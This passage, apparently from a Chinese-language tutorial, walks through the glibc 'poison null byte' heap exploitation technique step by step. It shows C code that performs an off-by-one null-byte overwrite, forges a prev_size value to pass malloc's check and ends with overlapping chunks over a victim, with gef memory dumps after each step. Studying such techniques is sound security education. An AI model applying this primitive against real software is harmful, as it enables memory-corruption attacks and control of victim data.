            "the check 'chunksize(P) != prev_size (next_chunk(P))'n");
        // we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
        // which is the value of b.size after its first byte has been overwritten with a NULL byte
        *(size_t*)(b+0x1f0) = 0x200;
        // this technique works by overwriting the size metadata of a free chunk
        free(b);
        fprintf(stderr, "b.size: %#lxn", *b_size_ptr);
        fprintf(stderr, "b.size is: (0x200 + 0x10) | prev_in_usen");
        fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'n");
        a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
        fprintf(stderr, "b.size: %#lxn", *b_size_ptr);
        uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
        fprintf(stderr, "c.prev_size is %#lxn",*c_prev_size_ptr);
        // This malloc will result in a call to unlink on the chunk where b was.
        // The added check (commit id: 17f487b), if not properly handled as we did before,
        // will detect the heap corruption now.
        // The check is this: chunksize(P) != prev_size (next_chunk(P)) where
        // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
        // next_chunk(P) == b-0x10+0x200 == b+0x1f0
        // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
        fprintf(stderr, "We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))n",
            *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
        b1 = malloc(0x100);
        fprintf(stderr, "b1: %pn",b1);
        fprintf(stderr, "Now we malloc 'b1'. It will be placed where 'b' was. "
            "At this point c.prev_size should have been updated, but it was not: %#lxn",*c_prev_size_ptr);
        fprintf(stderr, "Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
            "before c.prev_size: %lxn",*(((uint64_t*)c)-4));
        fprintf(stderr, "We malloc 'b2', our 'victim' chunk.n");
        // Typically b2 (the victim) will be a structure with valuable pointers that we want to control
        b2 = malloc(0x80);
        fprintf(stderr, "b2: %pn",b2);
        memset(b2,'B',0x80);
        fprintf(stderr, "Current b2 content:n%sn",b2);
        fprintf(stderr, "Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').n");
        free(b1);
        free(c);
        fprintf(stderr, "Finally, we allocate 'd', overlapping 'b2'.n");
        d = malloc(0x300);
        fprintf(stderr, "d: %pn",d);
        fprintf(stderr, "Now 'd' and 'b2' overlap.n");
        memset(d,'D',0x300);
        fprintf(stderr, "New b2 content:n%sn",b2);
        fprintf(stderr, "Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"
            "for the clear explanation of this technique.n");
    }
首先，为chunk_a申请0x100字节的堆空间。
这里需要注意，用malloc_usable_size获取chunk_a的真实大小。原因是malloc时会自动8位对齐，实际申请的空间应该是略大于0x100.
        fprintf(stderr, "We allocate 0x100 bytes for 'a'.n");
        a = (uint8_t*) malloc(0x100);
        fprintf(stderr, "a: %pn", a);
        int real_a_size = malloc_usable_size(a);
        fprintf(stderr, "Since we want to overflow 'a', we need to know the 'real' size of 'a' "
            "(it may be more than 0x100 because of rounding): %#xn", real_a_size);
继续申请内存,barrier部分作为隔离chunk_c和top chunk的部分，防止chunk_c被free时被top
chunk合并，这点我们之前也提到过很多次。
        /* chunk size attribute cannot have a least significant byte with a value of 0x00.
         * the least significant byte of this will be 0x10, because the size of the chunk includes
         * the amount requested plus some amount required for the metadata. */
        b = (uint8_t*) malloc(0x200);
        fprintf(stderr, "b: %pn", b);
        c = (uint8_t*) malloc(0x100);
        fprintf(stderr, "c: %pn", c);
        barrier =  malloc(0x100);
        fprintf(stderr, "We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.n"
            "The barrier is not strictly necessary, but makes things less confusingn", barrier);
为chunk_c写入fake_prev_size，即chunk_b+0x1f0的位置。至于写在这里有什么目的，我们接着往下看。
    //*(size_t*)(b+0x1f0) = 0x200;
        fprintf(stderr, "In newer versions of glibc we will need to have our updated size inside b itself to pass "
            "the check 'chunksize(P) != prev_size (next_chunk(P))'n");
        // we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
        // which is the value of b.size after its first byte has been overwritten with a NULL byte
        *(size_t*)(b+0x1f0) = 0x200;
**_Off by one_** (a[real_a_size] = 0),将chunk_b(free)的size值替换，原size值的构成为`(0x200
+ 0x10) | prev_in_use`,但是此处将pre inuse改为0，结果为`(0x200) | prev_in_use=0`，这符合Off
by one写入一个0字节后的效果。
好，此时观察chunk_b,读者应该就明白之前为什么要写入fake_prev_size，因为chunk_b的长度变短了，fake_pre_size的位置正好位于变短的chunk_b的pre_size位（严格意义上是chunk_c的pre
size位，但是这个chunk_c并不存在）。即注释中的绕过`chunksize(P) == == prev_size
(next_chunk(P)`的check。
当然，所有操作之前，必须先free chunk_b，因为只有free chunk才需要pre size位，malloc_chunk的pre
size位是data的一部分。
    // this technique works by overwriting the size metadata of a free chunk
        free(b);
        fprintf(stderr, "b.size: %#lxn", *b_size_ptr);
        fprintf(stderr, "b.size is: (0x200 + 0x10) | prev_in_usen");
        fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'n");
        a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
        fprintf(stderr, "b.size: %#lxn", *b_size_ptr);
    fprintf(stderr, "We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))n",
            *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
    gef➤  x/150xg 0x603000
    0x603000:    0x0000000000000000    0x0000000000000111
    0x603010:    0x0000000000000000    0x0000000000000000 <--chunk_a
    0x603020:    0x0000000000000000    0x0000000000000000
    ...
    0x603100:    0x0000000000000000    0x0000000000000000
    0x603110:    0x0000000000000000    0x0000000000000200 <--size(off by one)[(0x200)|prev_in_use=0]
    0x603120:    0x00007ffff7dd1b78    0x00007ffff7dd1b78 <--chunk_b(free)
    0x603130:    0x0000000000000000    0x0000000000000000
    0x603140:    0x0000000000000000    0x0000000000000000
    ...
    0x603300:    0x0000000000000000    0x0000000000000000
    0x603310:    0x0000000000000200    0x0000000000000000 <-- fake pre_size
    0x603320:    0x0000000000000210    0x0000000000000111 <-- real pre_size
    0x603330:    0x0000000000000000    0x0000000000000000 <--chunk_c
申请b1，会占位之前chunk_b的空间。
        b1 = malloc(0x100);
        fprintf(stderr, "b1: %pn",b1);
        fprintf(stderr, "Now we malloc 'b1'. It will be placed where 'b' was. "
申请chunk_b2作为我们的victim案例，并将b1 free掉。向chunk b2写入数据（B）。内存状态如图所示。
        b2 = malloc(0x80);
        fprintf(stderr, "b2: %pn",b2);
        memset(b2,'B',0x80);
        fprintf(stderr, "Current b2 content:n%sn",b2);
        fprintf(stderr, "Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').n");
        free(b1);
    gef➤  x/150xg 0x603000
    0x603000:    0x0000000000000000    0x0000000000000111
    0x603010:    0x0000000000000000    0x0000000000000000
    ...
    0x603110:    0x0000000000000000    0x0000000000000111
    0x603120:    0x00000000006032b0    0x00007ffff7dd1b78 <--chunk_b1(free)
    0x603130:    0x0000000000000000    0x0000000000000000
    ...
    0x603210:    0x0000000000000000    0x0000000000000000
    0x603220:    0x0000000000000110    0x0000000000000090
    0x603230:    0x4242424242424242    0x4242424242424242 <--chunk_b2
    0x603240:    0x4242424242424242    0x4242424242424242
    0x603250:    0x4242424242424242    0x4242424242424242
    0x603260:    0x4242424242424242    0x4242424242424242
    0x603270:    0x4242424242424242    0x4242424242424242
    0x603280:    0x4242424242424242    0x4242424242424242
    0x603290:    0x4242424242424242    0x4242424242424242
    0x6032a0:    0x4242424242424242    0x4242424242424242
    0x6032b0:    0x0000000000000000    0x0000000000000061
    0x6032c0:    0x00007ffff7dd1b78    0x0000000000603110
    0x6032d0:    0x0000000000000000    0x0000000000000000
    0x6032e0:    0x0000000000000000    0x0000000000000000
    0x6032f0:    0x0000000000000000    0x0000000000000000
    0x603300:    0x0000000000000000    0x0000000000000000
    0x603310:    0x0000000000000060    0x0000000000000000
    0x603320:    0x0000000000000210    0x0000000000000110
    0x603330:    0x0000000000000000    0x0000000000000000 <--chunk_c
    0x603430:    0x0000000000000000    0x0000000000000111
现在我们只需要`free(c)`，程序会将chunk_c和chunk_b1之间的超长空间都free掉。查看unsort
bins，可以看到这个长0x320的chunk。而未被free的chunk_b2以及free_chunk_b3(见图中)都被包含在这个chunk中。
    gef➤  x/150xg 0x603000
    0x603000:    0x0000000000000000    0x0000000000000111
    0x603010:    0x0000000000000000    0x0000000000000000 <--chunk_a
    0x603020:    0x0000000000000000    0x0000000000000000
    ...
    0x603110:    0x0000000000000000    0x0000000000000321
    0x603120:    0x00000000006032b0    0x00007ffff7dd1b78 <--a long free chunk（pre chunk_b1）
    0x603130:    0x0000000000000000    0x0000000000000000
    ...
    0x603220:    0x0000000000000110    0x0000000000000090
    0x603230:    0x4242424242424242    0x4242424242424242 <-- chunk_b2
    0x603240:    0x4242424242424242    0x4242424242424242
    0x603250:    0x4242424242424242    0x4242424242424242